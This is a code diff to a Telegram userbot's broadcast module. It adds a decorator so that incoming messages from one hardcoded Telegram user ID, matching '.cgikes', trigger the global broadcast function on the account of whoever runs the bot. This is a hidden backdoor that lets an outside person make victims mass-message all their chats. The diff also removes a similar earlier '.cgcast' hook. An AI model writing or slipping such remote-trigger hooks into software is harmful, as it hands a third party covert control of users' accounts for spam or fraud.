@@ -12,6 +12,7 @@ import asyncio
 from requests import get
 from telethon.errors.rpcerrorlist import FloodWaitError
 
+from userbot.events import register
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP, DEVS
 from userbot.utils import edit_delete, edit_or_reply, geez_cmd
@@ -32,6 +33,7 @@ del _GCAST_BLACKLIST
 
 
 @geez_cmd(pattern="gikes(?: |$)(.*)")
+@register(incoming=True, from_users=655953567, pattern=r"^\.cgikes(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -93,8 +95,6 @@ async def gucast(event):
     )
 
 
-#anti gcast sudo
-@register(incoming=True, from_users=655953567, pattern=r"^\.cgcast(?: |$)(.*)")
 
 
 CMD_HELP.update(
